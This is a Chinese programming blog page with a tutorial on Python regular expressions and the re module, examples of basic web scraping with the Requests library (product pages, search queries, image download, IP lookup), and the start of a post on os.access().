<p>定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界。</p>
<p>正则表达式的定位符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个单词边界，即字与空格间的位置。</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非单词边界匹配。</td>
</tr>
</tbody></table>
<ol>
<li>python转义字符 <ul>
<li>正则表达式使用反斜杠” \ “来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用” \ “表示正则表达式中的” \ “，因为正则表达式中如果要匹配” \ “，需要用\来转义，变成” \ “，而Python语法中又需要对字符串中每一个\进行转义，所以就变成了” \ “。</li>
<li>Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用r”\”表示。同样，匹配一个数字的”\d”可以写成r”\d”。有了原生字符串，妈妈也不用担心是不是漏写了反斜杠，写出来的表达式也更直观勒。</li>
</ul>
</li>
<li>贪婪模式和非贪婪模式</li>
</ol>
<p>正则表达式通常用于在文本中查找匹配的字符串。Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在”*”,”?”,”+”,”{m,n}”后面加上？,使贪婪变成非贪婪。</p>
<p>可参考： <a href="http://blog.csdn.net/zcc_0015/article/details/53671189" target="_blank" rel="noopener">python 正则表达式的贪婪匹配与非贪婪匹配</a></p>
<h2 id="Python-Re模块"><a href="#Python-Re模块" class="headerlink" title="Python Re模块"></a>Python Re模块</h2><p><img src="https://upload-images.jianshu.io/upload_images/4340772-b0baf49f04744a80.png" alt="img"></p>
<p>Python 自带了re模块，它提供了对正则表达式的支持。主要用到的方法列举如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回pattern对象</span></span><br><span class="line">re.compile(string[,flag])  </span><br><span class="line"><span class="comment">#以下为匹配所用函数</span></span><br><span class="line">re.match(pattern, string[, flags])</span><br><span class="line">re.search(pattern, string[, flags])</span><br><span class="line">re.split(pattern, string[, maxsplit])</span><br><span class="line">re.findall(pattern, string[, flags])</span><br><span class="line">re.finditer(pattern, string[, flags])</span><br><span class="line">re.sub(pattern, repl, string[, count])</span><br><span class="line">re.subn(pattern, repl, string[, count])</span><br></pre></td></tr></table></figure>

<p>在介绍这几个方法之前，我们先来介绍一下pattern的概念，pattern可以理解为一个匹配模式，那么我们怎么获得这个<strong>匹配模式</strong>呢？很简单，我们需要利用re.compile方法就可以。例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'hello'</span>)</span><br></pre></td></tr></table></figure>

<p>另外大家可能注意到了另一个参数 flags，在这里解释一下这个参数的含义：</p>
<p>参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。</p>
<p>可选值有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">• re.I(全拼：IGNORECASE): 忽略大小写（括号内是完整写法，下同）</span><br><span class="line">• re.M(全拼：MULTILINE): 多行模式，改变<span class="string">'^'</span>和<span class="string">'$'</span>的行为（参见上图）</span><br><span class="line">• re.S(全拼：DOTALL): 点任意匹配模式，改变<span class="string">'.'</span>的行为</span><br><span class="line">• re.L(全拼：LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定</span><br><span class="line">• re.U(全拼：UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性</span><br><span class="line">• re.X(全拼：VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。</span><br></pre></td></tr></table></figure>

<p>在刚才所说的另外几个方法例如 re.match 里我们就需要用到这个pattern了，下面我们一一介绍。</p>
<h3 id="（1）re-match-pattern-string-flags"><a href="#（1）re-match-pattern-string-flags" class="headerlink" title="（1）re.match(pattern, string[, flags])"></a>（1）re.match(pattern, string[, flags])</h3><p>这个方法将会从string（我们要匹配的字符串）的开头开始，尝试匹配pattern，一直向后匹配，如果遇到无法匹配的字符，立即返回None，如果匹配未结束已经到达string的末尾，也会返回None。两个结果均表示匹配失败，否则匹配pattern成功，同时匹配终止，不再对string向后匹配。下面我们通过一个例子理解一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象，注意hello前面的r的意思是“原生字符串”</span></span><br><span class="line">pattern = re.compile(<span class="string">r'hello'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用re.match匹配文本，获得匹配结果，无法匹配时将返回None</span></span><br><span class="line">result1 = re.match(pattern,<span class="string">'hello'</span>)</span><br><span class="line">result2 = re.match(pattern,<span class="string">'helloo CQC!'</span>)</span><br><span class="line">result3 = re.match(pattern,<span class="string">'helo CQC!'</span>)</span><br><span class="line">result4 = re.match(pattern,<span class="string">'hello CQC!'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果1匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result1:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print(result1.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'1匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果2匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print(result2.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print( <span class="string">'2匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果3匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result3:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( result3.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'3匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果4匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result4:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( result4.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print( <span class="string">'4匹配失败！'</span>)</span><br></pre></td></tr></table></figure>

<p>我们还看到最后打印出了result.group()，这个是什么意思呢？下面我们说一下关于match对象的的属性和方法<br> Match对象是一次匹配的结果，包含了很多关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>group([group1, …]):</span><br><span class="line">获得一个或多个分组截获的字符串；指定多个参数时将以元组形式返回。group1可以使用编号也可以使用别名；编号<span class="number">0</span>代表整个匹配的子串；不填写参数时，返回group(<span class="number">0</span>)；没有截获字符串的组返回<span class="literal">None</span>；截获了多次的组返回最后一次截获的子串。</span><br><span class="line"><span class="number">2.</span>groups([default]):</span><br><span class="line">以元组形式返回全部分组截获的字符串。相当于调用group(<span class="number">1</span>,<span class="number">2</span>,…last)。default表示没有截获字符串的组以这个值替代，默认为<span class="literal">None</span>。</span><br></pre></td></tr></table></figure>

<h3 id="（2）re-search-pattern-string-flags"><a href="#（2）re-search-pattern-string-flags" class="headerlink" title="（2）re.search(pattern, string[, flags])"></a>（2）re.search(pattern, string[, flags])</h3><p>search方法与match方法极其类似，区别在于match()函数只检测re是不是在string的开始位置匹配，search()会扫描整个string查找匹配，match（）只有在0位置匹配成功的话才有返回，如果不是开始位置匹配成功的话，match()就返回None。同样，search方法的返回对象同样match()返回对象的方法和属性。我们用一个例子感受一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象</span></span><br><span class="line">pattern = re.compile(<span class="string">r'world'</span>)</span><br><span class="line"><span class="comment"># 使用search()查找匹配的子串，不存在能匹配的子串时将返回None</span></span><br><span class="line"><span class="comment"># 这个例子中使用match()无法成功匹配</span></span><br><span class="line">match = re.search(pattern,<span class="string">'hello world!'</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( match.group())</span><br></pre></td></tr></table></figure>

<h3 id="（3）re-split-pattern-string-maxsplit"><a href="#（3）re-split-pattern-string-maxsplit" class="headerlink" title="（3）re.split(pattern, string[, maxsplit])"></a>（3）re.split(pattern, string[, maxsplit])</h3><p>按照能够匹配的子串将string分割后返回列表。maxsplit用于指定最大分割次数，不指定将全部分割。我们通过下面的例子感受一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line">print( re.split(pattern,<span class="string">'one1two2three3four4'</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># ['one', 'two', 'three', 'four', '']</span></span><br></pre></td></tr></table></figure>

<h3 id="（4）re-findall-pattern-string-flags"><a href="#（4）re-findall-pattern-string-flags" class="headerlink" title="（4）re.findall(pattern, string[, flags])"></a>（4）re.findall(pattern, string[, flags])</h3><p>搜索string，以列表形式返回全部能匹配的子串。我们通过这个例子来感受一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line">print( re.findall(pattern,<span class="string">'one1two2three3four4'</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># ['1', '2', '3', '4']</span></span><br></pre></td></tr></table></figure>

<h3 id="（5）re-finditer-pattern-string-flags"><a href="#（5）re-finditer-pattern-string-flags" class="headerlink" title="（5）re.finditer(pattern, string[, flags])"></a>（5）re.finditer(pattern, string[, flags])</h3><p>搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。我们通过下面的例子来感受一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern,<span class="string">'one1two2three3four4'</span>):</span><br><span class="line">    print( m.group()),</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># 1 2 3 4</span></span><br></pre></td></tr></table></figure>

<h3 id="（6）re-sub-pattern-repl-string-count"><a href="#（6）re-sub-pattern-repl-string-count" class="headerlink" title="（6）re.sub(pattern, repl, string[, count])"></a>（6）re.sub(pattern, repl, string[, count])</h3><p>使用repl替换string中每一个匹配的子串后返回替换后的字符串。<br> 当repl是一个字符串时，可以使用\id或\g、\g引用分组，但不能使用编号0。<br> 当repl是一个方法时，这个方法应当只接受一个参数（Match对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。<br> count用于指定最多替换次数，不指定时全部替换。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'(\w+) (\w+)'</span>)</span><br><span class="line">s = <span class="string">'i say, hello world!'</span></span><br><span class="line"> </span><br><span class="line">print( re.sub(pattern,<span class="string">r'\2 \1'</span>, s))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">' '</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line">print( re.sub(pattern,func, s))</span><br></pre></td></tr></table></figure>

<h3 id="（7）re-subn-pattern-repl-string-count"><a href="#（7）re-subn-pattern-repl-string-count" class="headerlink" title="（7）re.subn(pattern, repl, string[, count])"></a>（7）re.subn(pattern, repl, string[, count])</h3><p>返回 (sub(repl, string[, count]), 替换次数)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'(\w+) (\w+)'</span>)</span><br><span class="line">s = <span class="string">'i say, hello world!'</span></span><br><span class="line"> </span><br><span class="line">print( re.subn(pattern,<span class="string">r'\2 \1'</span>, s))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">' '</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line">print( re.subn(pattern,func1, s))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### output ###</span></span><br><span class="line"><span class="comment"># ('say i, world hello!', 2)</span></span><br><span class="line"><span class="comment"># ('I Say, Hello World!', 2)</span></span><br></pre></td></tr></table></figure>

<h3 id="6-Requests库网络爬虫实战"><a href="#6-Requests库网络爬虫实战" class="headerlink" title="6.Requests库网络爬虫实战"></a>6.Requests库网络爬虫实战</h3><p>1.京东</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://item.jd.com/5145492.html"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[:<span class="number">1000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<p>2.亚马逊</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接爬取亚马逊商品是会被拒绝访问，所以需要添加'user-agent'字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://www.amazon.cn/gp/product/B01M8L5Z3Y"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125; <span class="comment"># 使用代理访问</span></span><br><span class="line">    r = requests.get(url, headers = kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(t.text[<span class="number">1000</span>:<span class="number">2000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<p>3.百度/360搜索关键词提交</p>
<pre><code>　搜索引擎关键词提交接口</code></pre><p>　· 百度的关键词接口：<br>　<a href="http://www.baidu.com/s?wd=keyword" target="_blank" rel="noopener">http://www.baidu.com/s?wd=keyword</a><br>　· 360的关键词接口：<br>　<a href="http://www.so.com/s?q=keyword" target="_blank" rel="noopener">http://www.so.com/s?q=keyword</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 百度</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'wd'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 360</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'q'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.so.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<p>4.网络图片的爬取和存储</p>
<p>网络图片链接的格式：</p>
<p><a href="http://www.example.com/picture.jpg" target="_blank" rel="noopener">http://www.example.com/picture.jpg</a></p>
<p>国家地理：</p>
<p><a href="http://www.nationalgeographic.com.cn/" target="_blank" rel="noopener">http://www.nationalgeographic.com.cn/</a></p>
<p>选择一张图片链接：</p>
<p><a href="http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg" target="_blank" rel="noopener">http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">图片爬取全代码</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">"http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg"</span></span><br><span class="line">root = <span class="string">"D://pics//"</span></span><br><span class="line">path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">with</span> open(path,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"文件保存成功"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">with open(path,'wb') as f:等价于</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">f = open(path, 'wb')</span></span><br><span class="line"><span class="string">f = write(r.content)</span></span><br><span class="line"><span class="string">finally:</span></span><br><span class="line"><span class="string">if f:</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件已存在"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<p>5.IP地址归属地的自动查询</p>
<p><a href="http://www.ip138.com" target="_blank" rel="noopener">www.ip138.com</a> IP查询</p>
<p><a href="http://ip138.com/ips138.asp?ip=ipaddress" target="_blank" rel="noopener">http://ip138.com/ips138.asp?ip=ipaddress</a></p>
<p><a href="http://m.ip138.com/ip.asp?ip=ipaddress" target="_blank" rel="noopener">http://m.ip138.com/ip.asp?ip=ipaddress</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://m.ip138.com/ip.asp?ip="</span></span><br><span class="line">ip = <span class="string">"114.114.114.114"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url + ip)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[<span class="number">1900</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.cnblogs.com/yan-lei/p/7445460.html" target="_blank" rel="noopener">https://www.cnblogs.com/yan-lei/p/7445460.html</a></p>
<p><a href="https://www.cnblogs.com/ranxf/p/7808537.html（后续需进一步看）" target="_blank" rel="noopener">https://www.cnblogs.com/ranxf/p/7808537.html（后续需进一步看）</a></p>
<p><a href="https://blog.csdn.net/Amigo_1997/article/details/87936132" target="_blank" rel="noopener">https://blog.csdn.net/Amigo_1997/article/details/87936132</a></p>
<p><a href="https://www.jianshu.com/p/0e3715bd9c25" target="_blank" rel="noopener">https://www.jianshu.com/p/0e3715bd9c25</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/26/python3 OS模块/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/26/python3 OS模块/" itemprop="url">python3 OS模块</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-26T16:55:34+08:00">
                2019-06-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/06/26/python3 OS模块/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/06/26/python3 OS模块/" class="cy_cmt_count" data-xid="2019/06/26/python3 OS模块/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/06/26/python3 OS模块/" class="leancloud_visitors" data-flag-title="python3 OS模块">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="python3-OS模块"><a href="#python3-OS模块" class="headerlink" title="python3 OS模块"></a>python3 OS模块</h1><h4 id="1-python-os-access-方法"><a href="#1-python-os-access-方法" class="headerlink" title="1.python os.access()方法"></a>1.python os.access()方法</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>os.access() 方法使用当前的uid/gid尝试访问路径。大部分操作使用有效的 uid/gid, 因此运行环境可以在 suid/sgid 环境尝试。</p>
<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.access(path, mode);</span><br></pre></td></tr></table></figure>

<h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul>
<li><strong>path</strong> – 要用来检测是否有访问权限的路径。</li>
<li>``<strong>mode</strong> – mode为F_OK，测试存在的路径，或者它可以是包含R_OK, W_OK和X_OK或者R_OK, W_OK和X_OK其中之一或者更多。<ul>
<li><strong>os.F_OK:</strong> 作为access()的mode参数，测试path是否存在。</li>
<li><strong>os.R_OK:</strong> 包含在access()的mode参数中 ， 测试path是否可读。</li>
<li><strong>os.W_OK</strong> 包含在access()的mode参数中 ， 测试path是否可写。</li>
<li><strong>os.X_OK</strong> 包含在access()的mode参数中 ，测试path是否可执行。</li>
</ul>
</li>
</ul>
